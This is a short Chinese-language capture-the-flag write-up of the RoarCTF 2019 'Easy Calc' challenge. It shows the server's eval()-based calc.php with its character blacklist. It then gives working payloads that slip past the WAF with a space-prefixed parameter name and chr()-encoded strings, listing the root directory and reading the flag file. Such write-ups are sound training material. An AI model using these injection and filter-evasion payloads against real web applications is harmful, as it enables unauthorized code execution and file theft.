## [RoarCTF 2019]Easy Calc

----

![image-20240604100606279](https://gitee.com/bx33661/image/raw/master/path/image-20240604100606279.png)

我们了解到这道题存在WAF！

```javascript
$('#calc').submit(function(){
       $.ajax({ //采用ajax异步
            url:"calc.php?num="+encodeURIComponent($("#content").val()), //url为calc.php?num=后面处理的数据
            type:'GET',													 //传输类型为get
            success:function(data){										 //成功响应
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){											//错误响应
                alert("这啥?算不来!");
            }
        })
        return false;
    })

```

我们发现是calc.php这个在处理我们的数据，我们尝试访问它，成功进入页面：

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

进行传参发现WAF会拦截字母的传入，因此我们要想办法绕过

> `/calc?%20num=******`
>
> `/calc?%20num=var_dump(scandir(chr(47)))`
>
> scandir:列出目录

```html
num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

最终得到flag

